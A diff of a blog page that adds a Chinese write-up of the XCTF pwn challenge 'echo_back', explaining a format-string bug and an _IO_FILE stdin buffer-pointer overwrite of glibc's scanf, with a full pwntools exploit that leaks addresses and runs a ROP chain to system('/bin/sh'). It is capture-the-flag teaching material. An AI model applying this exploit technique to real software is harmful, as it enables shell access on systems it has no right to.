@@ -145,198 +145,269 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">echo_back</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-12-06 17:18:28
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IO-FILE/">_IO_FILE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <h3 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211206171954614.png"
+                      alt="image-20211206171954614"
+                ></p>
+<p>保护全开</p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_A10(a1, a2, a3);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_A53();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = menu();</span><br><span class="line">      <span class="keyword">if</span> ( result != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      printf_vuln(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> &amp;&amp; !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      set_name(s);</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">set_name</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, a1, <span class="number">7uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">printf_vuln</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;nbytes + <span class="number">4</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;length:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> || nbytes &gt; <span class="number">6</span> )</span><br><span class="line">    LODWORD(nbytes) = <span class="number">7</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;nbytes + <span class="number">4</span>, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s say:&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;anonymous say:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<p>整体流程就是你先设置名字然后说一句话</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点在printf_vuln函数里面，存在很明显的格式化字符串的漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211206172724594.png"
+                      alt="image-20211206172724594"
+                ></p>
+<p>在里面存在几处可以利用的信息(我这是manjaro所以__libc_start_main的地址有区别，但是不影响，后续还是要用ubuntu调试)，目前就是我们可以泄漏libc地址，可以泄漏程序地址。</p>
+<p>但是问题是我们输入的内容只能是七个字符，所以需要攻击scanf。</p>
+<h3 id="IO-FIEL"><a href="#IO-FIEL" class="headerlink" title="_IO_FIEL"></a>_IO_FIEL</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span>  </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Standard streams.  */</span>  </span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdin</span>;</span>      <span class="comment">/* Standard input stream.  */</span>  </span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdout</span>;</span>     <span class="comment">/* Standard output stream.  */</span>  </span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stderr</span>;</span>     <span class="comment">/* Standard error output stream.  */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __STDC__  </span></span><br><span class="line"><span class="comment">/* C89/C99 say they&#x27;re macros.  Make them happy.  */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdin stdin  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdout stdout  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stderr stderr  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> </span></span><br></pre></td></tr></table></figure>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;  </span><br><span class="line">_IO_FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;  </span><br><span class="line">_IO_FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_; </span><br></pre></td></tr></table></figure>
 
-    }
+<p>可以看出存在三个文件指针</p>
+<p>文件读取过程:<code>_IO_new_file_underflow</code>这个函数调用<code>_IO_SYSREAD</code>这个函数来实现的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  ## 如果输入缓冲区里存在数据，则直接返回</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  ##调用_IO_SYSREAD函数最终执行系统调用读取数据</span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line">  ## 设置结构体指针</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>
 
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211206173703902.png"
+                      alt="image-20211206173703902"
+                ></p>
+<p>再就是_IO_FILE这个结构。结合上面的函数可以看出来，<code>_IO_SYSREAD</code>函数是将数据写到<code>_IO_buf_base</code>这个位置，大小是<code>_IO_buf_end-_IO_buf_end</code>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211206174108790.png"
+                      alt="image-20211206174108790"
+                ></p>
+<p>可以看到这个<code>_IO_2_1_stdin_</code>的地址为0x7f680bbe48e0</p>
+<p>虽然我们格式化字符串想要直接修改到我们想要的地方是不得行的，但是我们可以将_IO_buf_base的内容的最后一个字节删去，这样地址就变成了0x7f680bbe4900计算一下发现到了<code>_IO_write_base</code>的地址，我就可以进一步修改这个结构内部的数据了。</p>
+<p>我们该怎么去删除_IO_buf_base最后一个字节呢？题目还给了一个setname函数，这个函数我们写入的参数也是存在在栈上的，所以一样可以使用格式化字符串，但是只允许有七个字节，但是一般地址都存在有\x00位，又因为是小端序，所以直接写入就好。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo_back&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./echo_back&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;111.200.241.244&#x27;, 63836)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">_IO_2_1_stdin_ = libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf_vuln</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name:&#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_vuln(<span class="string">b&#x27;%19$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;anonymous say:&#x27;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">int</span>(r.recvuntil(</span><br><span class="line">    <span class="string">b&#x27;-----------menu-----------&#x27;</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span>(libc_start_main)</span><br><span class="line">libc_base = libc_start_main-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_2_1_stdin_addr = libc_base+_IO_2_1_stdin_</span><br><span class="line">_IO_buf_addr = _IO_2_1_stdin_addr+<span class="number">0x8</span>*<span class="number">7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_IO_buf_addr:&quot;</span>, <span class="built_in">hex</span>(_IO_buf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_IO_2_1_stdin_addr:&quot;</span>, <span class="built_in">hex</span>(_IO_2_1_stdin_addr))</span><br><span class="line"></span><br><span class="line">printf_vuln(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;anonymous say:&#x27;</span>)</span><br><span class="line">main_ret_addr = <span class="built_in">int</span>(r.recvuntil(</span><br><span class="line">    <span class="string">b&#x27;-----------menu-----------&#x27;</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">elf_base = main_ret_addr-<span class="number">0xd08</span></span><br><span class="line"><span class="built_in">print</span>(elf_base)</span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000000d93</span>+elf_base</span><br><span class="line"></span><br><span class="line">printf_vuln(<span class="string">b&#x27;%12$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;anonymous say:&#x27;</span>)</span><br><span class="line">main_rbp_addr = <span class="built_in">int</span>(r.recvuntil(</span><br><span class="line">    <span class="string">b&#x27;-----------menu-----------&#x27;</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(main_rbp_addr)</span><br><span class="line"></span><br><span class="line">setName(p64(_IO_buf_addr))</span><br><span class="line">printf_vuln(<span class="string">b&#x27;%16$hhn&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">payload = p64(_IO_2_1_stdin_addr+<span class="number">0x83</span>)*<span class="number">3</span> + \</span><br><span class="line">    p64(main_rbp_addr+<span class="number">8</span>)+p64(main_rbp_addr+<span class="number">8</span>+<span class="number">8</span>*<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload)-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">payload = p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
+<p>exp中的循环是因为这条源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>
 
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
+<p>我没在修改结构体就会执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_end += count;</span><br></pre></td></tr></table></figure>
 
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
+<p>所以需要绕过这条if语句</p>
+<p>在getchar内部有这样一条语句，所以循环绕过就行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_end++</span><br></pre></td></tr></table></figure>
 
 
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
 
 
-}
 
+<p>参考博客:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44145820/article/details/104629998" >https://blog.csdn.net/weixin_44145820/article/details/104629998<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/103114909" >https://blog.csdn.net/seaaseesa/article/details/103114909<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/12/14/MT-CTF/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">MT-CTF2021复现</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/12/06/XDCTF-2015-filemanager/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XDCTF_2015_filemanager</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
